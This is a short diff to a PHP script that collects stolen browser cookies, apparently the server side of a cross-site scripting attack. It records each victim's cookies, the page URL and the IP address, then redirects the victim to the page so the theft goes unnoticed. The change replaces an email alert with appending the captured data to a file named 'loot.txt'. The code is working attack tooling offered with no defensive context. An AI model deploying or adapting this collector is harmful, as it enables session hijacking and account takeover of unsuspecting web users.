@@ -11,7 +11,10 @@ switch ($type) {
         $ip = ip();
         $message = '<p>COOKIES: <b>' . $cookie . '</b></p><p>URL: <b>' . $link . '</b></p><p>' . $ip . '</p>';
         if (!(empty($cookie) && empty($link))) {
-            mail_alert($message);
+//            mail_alert($message);
+//            header("Location: $link");
+            $file = fopen("loot.txt", "a+");
+            fwrite($file, $message);
             header("Location: $link");
         }
         break;
